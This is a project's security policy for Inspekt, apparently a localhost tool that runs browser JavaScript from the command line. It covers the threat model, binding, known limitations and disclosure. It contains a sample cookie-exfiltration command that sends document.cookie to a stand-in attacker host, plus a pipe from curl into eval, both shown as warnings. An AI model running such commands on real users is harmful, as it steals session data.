# Security Policy

## 1. Security Overview

### Inspekt's Security Model

Inspekt is a **local development tool** designed to execute JavaScript in your browser from the command line. The security model is intentionally simple and built on the following principles:

- **Localhost-only by default**: All network interfaces bind to `127.0.0.1` exclusively
- **No remote access**: The server is not designed or hardened for internet exposure
- **User trust model**: Users must trust the JavaScript code they execute
- **Browser security**: Relies on browser sandboxing and same-origin policy

### Threat Model

Inspekt operates under a **localhost-only threat model**:

- **Primary risk**: Malicious JavaScript execution by user action
- **Acceptable risk**: Local process communication without authentication
- **Mitigated risk**: Remote network attacks (server not exposed)
- **Out of scope**: Browser vulnerabilities (separate security boundary)

### Trust Assumptions

Using Inspekt requires trusting:

1. **JavaScript code you execute** - All scripts run with full page context access
2. **Userscript manager** - Extensions like Violentmonkey/Tampermonkey have elevated privileges
3. **Local processes** - Any process on localhost can communicate with the bridge server
4. **Your browser** - Security sandbox and isolation between tabs
5. **Local filesystem** - Configuration and script files are read without validation

## 2. Security by Design

### Localhost Binding (127.0.0.1 Only)

The bridge server is **hardcoded** to bind only to the loopback interface:

```python
# inspekt/bridge_ws.py
HOST = "127.0.0.1"  # Never binds to 0.0.0.0 or public IPs
PORT = 8765
```

This design ensures:

- Server is only accessible from the same machine
- No network exposure to LAN or internet
- Protection against remote attacks by default

**Warning**: Do not modify the `HOST` constant to bind to `0.0.0.0` or a public IP address. This would expose your browser to remote code execution.

### No Remote Access by Default

- HTTP API: `http://127.0.0.1:8765`
- WebSocket: `ws://127.0.0.1:8766/ws`

Both endpoints are localhost-only. There is no configuration option to expose remotely (by design).

### User Must Trust JavaScript Scripts

Inspekt executes arbitrary JavaScript in your browser. This is **by design** and is the core functionality:

- No sandboxing beyond browser's built-in security
- Scripts have full DOM access
- Scripts can read page content, cookies, localStorage
- Scripts can manipulate the page, submit forms, make network requests
- Scripts execute with the same privileges as the page itself

**You must only execute JavaScript code you trust.**

### Browser Same-Origin Policy

The userscript runs with the origin of the current page:

- No cross-origin access beyond what the page itself has
- Subject to Content Security Policy (CSP) of the page
- Cannot bypass CORS restrictions
- Cannot access different domains (unless page can)

## 3. Threat Model

### In Scope

These threats are relevant and considered:

#### 1. Local Privilege Escalation

**Threat**: Malicious script escalates privileges on local machine.

**Mitigation**:
- Browser sandbox isolates script execution
- Scripts cannot access filesystem or system resources directly
- Python server runs with user privileges (not elevated)

#### 2. Malicious JavaScript Execution

**Threat**: User executes untrusted JavaScript that steals data or performs unwanted actions.

**Mitigation**:
- User education: Only run trusted scripts
- Explicit user action required (no automatic execution)
- Scripts are visible before execution
- User can review code in terminal or files

#### 3. Configuration Tampering

**Threat**: Malicious process modifies `config.json` to enable harmful behavior.

**Mitigation**:
- Configuration has minimal attack surface
- No security-critical settings (all localhost)
- File permissions follow OS defaults
- No automatic config reload while running

#### 4. Userscript Injection Attacks

**Threat**: Malicious website exploits the userscript to execute code.

**Mitigation**:
- Userscript uses `@match *://*/*` (runs on all sites)
- Only executes code received via authenticated WebSocket
- Only active tab processes commands
- Browser's same-origin policy still applies

### Out of Scope

These threats are explicitly out of scope for Inspekt:

#### 1. Remote Attacks

**Not applicable**: Server never exposed to network by design. Binding to `127.0.0.1` prevents remote access.

#### 2. Network-Based Attacks

**Not applicable**: All communication is localhost-only. No network traffic leaves the machine.

#### 3. Browser Vulnerabilities

**Separate concern**: Browser security is the responsibility of browser vendors. Inspekt relies on browser sandboxing.

#### 4. Man-in-the-Middle Attacks

**Not applicable**: Localhost communication cannot be intercepted by network attackers. Local user with root/admin can already compromise system.

## 4. Security Features

### Network Security

#### Localhost Binding
```python
# HTTP server
http_site = web.TCPSite(runner, "127.0.0.1", 8765)

# WebSocket server
ws_site = web.TCPSite(runner, "127.0.0.1", 8766)
```

**Guarantees**:
- No remote connections possible
- Only local processes can connect
- Protected by OS-level networking stack

#### No Remote Binding Configuration

There is intentionally no option to configure the bind address. This prevents accidental exposure.

#### WebSocket Origin Validation

**Current status**: Not implemented (not necessary for localhost-only).

**Future consideration**: Could validate `Origin` header to prevent local malicious websites from connecting.

### Code Execution

#### All JavaScript Execution is Intentional

- User must explicitly run `inspekt eval <code>` or `inspekt exec <file>`
- No automatic code execution on server start
- No code execution from web requests without user action
- Clear audit trail in terminal

#### User Must Install Userscript Explicitly

- Userscript is not automatically installed
- User must use extension manager (Violentmonkey/Tampermonkey)
- User can review userscript code before installation
- User can disable/uninstall anytime

#### No Automatic Code Execution

- Server does not execute JavaScript on behalf of websites
- Only executes code sent via CLI commands
- Code execution requires active browser tab with userscript

#### Scripts Loaded from Trusted Local Filesystem

Built-in scripts (`inspekt/scripts/`) are loaded from local filesystem:

```python
# Scripts are loaded from package installation directory
script_path = Path(__file__).parent / "scripts" / script_name
```

**User responsibility**: Ensure package installation is from trusted source (official repository).

### Configuration Security

#### Config Files are Local User Files

- `config.json` stored in user directory
- No sensitive data required in configuration
- Standard file permissions apply

#### No Secrets in Config by Default

Current configuration options:

```json
{
  "control": {
    "verbose": true,
    "speak-all": true,
    "verbose-logging": false
  }
}
```

No API keys, tokens, or passwords required.

#### No Secrets in Logs or Output

- Server logs connection events only
- No sensitive page data logged
- Error messages sanitized to avoid leaking user data
- Request IDs are UUIDs (not predictable)

#### File Permissions Follow OS Defaults

- No special file permissions required
- Config file readable/writable by user only
- Scripts use standard package installation permissions

## 5. Known Limitations

### Arbitrary JavaScript Execution

**By design**: Inspekt executes arbitrary JavaScript code in your browser.

**Implications**:
- Malicious scripts can steal session cookies
- Scripts can submit forms, make purchases, send emails
- Scripts can read sensitive page content
- Scripts can modify the DOM, inject content
- Scripts can make network requests to external servers

**Mitigation**:
- Only run JavaScript you trust and understand
- Review scripts before execution
- Use browser DevTools to inspect script behavior
- Test scripts on non-sensitive pages first

**Example attack vector**:
```bash
# Malicious script steals cookies
inspekt eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
```

**Defense**: Review all code before execution. Don't run untrusted scripts.

### No Authentication

**Current status**: No authentication mechanism between CLI and server.

**Implications**:
- Any local process can connect to the bridge server
- Any local process can execute JavaScript in your browser
- Malicious software on your machine can use the bridge

**Acceptable for local development tool**:
- If your machine is compromised, attacker already has access
- Localhost-only binding prevents remote abuse
- User controls when server is running (`inspekt server start/stop`)

**Future enhancement**: Optional token-based authentication for additional security layer.

### No Encryption

**WebSocket traffic unencrypted**: `ws://` instead of `wss://`

**HTTP endpoints unencrypted**: `http://` instead of `https://`

**Why this is acceptable**:
- Traffic never leaves localhost interface
- OS kernel handles localhost communication (no network)
- Faster performance without TLS overhead
- No certificate management needed

**Not acceptable if you modify HOST**: If you change binding to `0.0.0.0`, traffic would be unencrypted over network.

### No Rate Limiting

**Current status**: No rate limiting on API endpoints.

**Implications**:
- Local process could spam server with requests
- Could cause high CPU usage in browser tab
- Could cause memory buildup in server

**Acceptable for local development tool**:
- User controls both CLI and server
- Easy to stop server if needed
- Cleanup task removes old requests after 5 minutes

**Future enhancement**: Optional rate limiting for additional protection.

## 6. Best Practices

### For Users

#### Only Run Trusted JavaScript Code

```bash
# Good: Review script first
cat my_script.js
inspekt exec my_script.js

# Good: Understand inline code
inspekt eval "document.querySelectorAll('a').length"

# Bad: Run unknown script from internet
curl https://untrusted.com/script.js | inspekt eval  # DON'T DO THIS
```

#### Review Scripts Before Execution

Before running any script:

1. Read the JavaScript code completely
2. Understand what it does
3. Check for network requests or data exfiltration
4. Test on non-sensitive pages first
5. Use browser DevTools to monitor execution

#### Don't Bind to 0.0.0.0 or Public IPs

**Never modify the server to bind to non-localhost addresses:**

```python
# DANGEROUS - Do not do this!
HOST = "0.0.0.0"  # Exposes to network
HOST = "192.168.1.100"  # Exposes to LAN
```

This would allow remote code execution in your browser from any machine that can reach your IP.

#### Keep Userscript Updated

```bash
# Check version
inspekt eval "window.__ZEN_BRIDGE_VERSION__"

# Current version: 3.4
```

Update the userscript when new versions are released to get security fixes and improvements.

#### Use Firewall to Block External Access

Even with localhost binding, additional protection:

```bash
# macOS firewall
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/python3
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --block /usr/local/bin/python3

# Linux iptables (if needed)
sudo iptables -A INPUT -p tcp --dport 8765 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8765 -j DROP
```

This blocks external connections as a defense-in-depth measure.

#### Stop Server When Not in Use

```bash
# Stop server when done
inspekt server stop

# Check status
inspekt server status
```

If the server isn't running, the attack surface is eliminated.

### For Developers

#### Validate All Inputs

When adding new features:

```python
# Good: Validate input
if not code or not isinstance(code, str):
    return web.json_response({"ok": False, "error": "missing code"}, status=400)

# Good: Validate request_id
if not request_id:
    return web.json_response({"ok": False, "error": "missing request_id"}, status=400)
```

#### Sanitize Error Messages (No Sensitive Data)

```python
# Good: Generic error
return web.json_response({"ok": False, "error": "Request failed"}, status=500)

# Bad: Leaks internal paths
return web.json_response({"ok": False, "error": f"File not found: {user_path}"}, status=500)
```

#### No Secrets in Code or Logs

- Never log sensitive data (cookies, tokens, passwords)
- Never commit secrets to repository
- Never send secrets in API responses
- Sanitize URLs in logs (remove query parameters)

#### Follow Principle of Least Privilege

- Run server with user privileges (not root/admin)
- Don't request unnecessary browser permissions
- Limit userscript to minimum required functionality
- Don't expose internal state unnecessarily

#### Document Security Assumptions

When adding features, document:
- What security assumptions are made
- What trust is required from user
- What could go wrong if misused
- What threat model applies

## 7. Vulnerability Reporting

### How to Report Security Issues

If you discover a security vulnerability in Inspekt:

1. **Do NOT open a public GitHub issue** (gives attackers notice)
2. **Email the maintainer directly**: Include [SECURITY] in subject line
3. **Provide details**:
   - Description of vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

### Expected Response Time

- **Initial response**: Within 48 hours
- **Assessment**: Within 1 week
- **Fix timeline**: Depends on severity
  - Critical: 1-7 days
  - High: 1-2 weeks
  - Medium: 2-4 weeks
  - Low: Best effort

### Responsible Disclosure Policy

We follow responsible disclosure:

1. **Report received**: Acknowledge receipt within 48 hours
2. **Validation**: Confirm vulnerability and assess impact
3. **Fix development**: Create and test fix privately
4. **Coordinated disclosure**: Agree on disclosure timeline
5. **Public release**: Release fix and announce vulnerability
6. **Credit**: Reporter credited in release notes (if desired)

### Contact Information

- **GitHub Issues**: For non-security bugs and features
- **Email**: Contact repository owner via GitHub profile
- **Security issues**: Use private communication channels only

## 8. Security Checklist

### For Developers Adding Features

Before merging new code, verify:

- [ ] **Network binding**: Does it bind to network interfaces?
  - If yes: Must bind to `127.0.0.1` only
  - Never bind to `0.0.0.0` or public IPs

- [ ] **Code execution**: Does it execute code?
  - If yes: Must require explicit user action
  - No automatic execution
  - Code visible to user before execution

- [ ] **Logging**: Does it log sensitive data?
  - Must not log cookies, tokens, passwords
  - Must not log full URLs with query parameters
  - Must sanitize error messages

- [ ] **Input validation**: Does it accept user input?
  - Must validate all inputs
  - Must sanitize file paths
  - Must handle errors gracefully

- [ ] **Error handling**: Does it handle errors safely?
  - Must not leak internal paths
  - Must not expose stack traces to users
  - Must not reveal sensitive information in errors

- [ ] **Dependencies**: Does it add new dependencies?
  - Audit dependency security
  - Check for known vulnerabilities
  - Keep dependencies minimal

- [ ] **Configuration**: Does it add config options?
  - No security-critical settings
  - No secrets in config file
  - Safe defaults

## 9. Version Compatibility

### Userscript Version Checking

The userscript exposes its version:

```javascript
window.__ZEN_BRIDGE_VERSION__ = '3.4';
```

Check version from CLI:

```bash
inspekt eval "window.__ZEN_BRIDGE_VERSION__"
```

### Protocol Version Negotiation

**Current status**: No formal protocol versioning.

**Future enhancement**: Add version negotiation to handle:
- Breaking changes in message format
- New features requiring userscript update
- Graceful degradation for old userscripts

### Handling Version Mismatches

**Current behavior**:
- Server and userscript may have mismatched versions
- Newer CLI commands may not work with old userscript
- No automatic version checking

**Best practice**:
- Keep userscript updated
- Update server and userscript together
- Test after updates

**Future enhancement**:
```bash
# Planned: Version check command
inspekt version --check-userscript

# Planned: Warning on version mismatch
inspekt eval "code"  # Warns if userscript is outdated
```

## 10. Future Enhancements

### Optional Token-Based Authentication

**Proposal**: Add optional authentication between CLI and server.

**Implementation**:
```bash
# Server generates token on start
inspekt server start
# Server token: abc123xyz

# CLI uses token
inspekt eval "code" --token abc123xyz

# Or store in environment
export ZEN_BRIDGE_TOKEN=abc123xyz
inspekt eval "code"  # Uses token from env
```

**Benefits**:
- Prevents other local processes from using bridge
- Optional (disabled by default for ease of use)
- Additional security layer for sensitive environments

### WebSocket Origin Validation

**Proposal**: Validate `Origin` header on WebSocket connections.

**Implementation**:
```python
async def websocket_handler(request):
    origin = request.headers.get('Origin', '')

    # Only accept connections from browser extensions
    if not origin.startswith('moz-extension://') and not origin.startswith('chrome-extension://'):
        return web.Response(status=403, text='Forbidden: Invalid origin')
```

**Benefits**:
- Prevents malicious websites from connecting to bridge
- Additional protection against local web attacks
- No impact on legitimate userscript usage

### Rate Limiting

**Proposal**: Add rate limiting to API endpoints.

**Implementation**:
```python
# Limit to 100 requests per minute per endpoint
rate_limiter = RateLimiter(requests=100, period=60)

async def handle_http_run(request):
    if not rate_limiter.allow():
        return web.json_response({"ok": False, "error": "Rate limit exceeded"}, status=429)
    # ... rest of handler
```

**Benefits**:
- Prevents accidental DoS from buggy scripts
- Limits impact of malicious local processes
- Protects browser from excessive JavaScript execution

### Audit Logging

**Proposal**: Optional audit log of all commands executed.

**Implementation**:
```bash
# Enable audit logging
inspekt config set audit.enabled true
inspekt config set audit.log_file ~/.inspekt/audit.log

# Audit log format
[2025-10-27 10:30:45] EVAL "document.title" -> "Example Domain"
[2025-10-27 10:31:12] EXEC script.js -> OK
[2025-10-27 10:32:03] CLICK "button#submit" -> OK
```

**Benefits**:
- Review history of commands executed
- Detect suspicious activity
- Debugging and troubleshooting
- Compliance and accountability

### Content Security Policy (CSP) Awareness

**Proposal**: Detect and warn about CSP violations.

**Implementation**:
```bash
inspekt eval "fetch('https://api.example.com')"
# Warning: This page has a strict CSP that may block fetch requests
# CSP: default-src 'self'
```

**Benefits**:
- Better user experience (explain why things fail)
- Security awareness (understand page restrictions)
- Debugging aid

### Secure Script Repository

**Proposal**: Verified repository of safe, community scripts.

**Implementation**:
```bash
# Install verified script
inspekt script install screenshot-tool --verified

# List available verified scripts
inspekt script list --verified

# Each script has checksum and signature
```

**Benefits**:
- Safe scripts for common tasks
- Community contributions with review
- Reduces risk of running untrusted code
- Encourages best practices

---

## Summary

Inspekt is designed as a **local development tool** with a simple, pragmatic security model:

**Core Principles**:
1. Localhost-only (never exposed to network)
2. User trusts scripts they execute
3. No authentication needed (localhost trust model)
4. Browser provides security boundary

**Acceptable Risks**:
- Local processes can connect without authentication
- Arbitrary JavaScript execution by design
- No encryption for localhost traffic

**Unacceptable Risks**:
- Remote code execution (prevented by localhost binding)
- Automatic code execution (requires user action)
- Secret leakage (no secrets in config/logs)

**User Responsibility**:
- Only execute trusted JavaScript
- Keep userscript updated
- Review scripts before running
- Don't modify server to bind to public IPs

This security model is appropriate for a development tool running on a trusted local machine. It prioritizes usability and simplicity while maintaining safety for its intended use case.

For production use cases or environments with strict security requirements, additional measures from the "Future Enhancements" section should be considered.
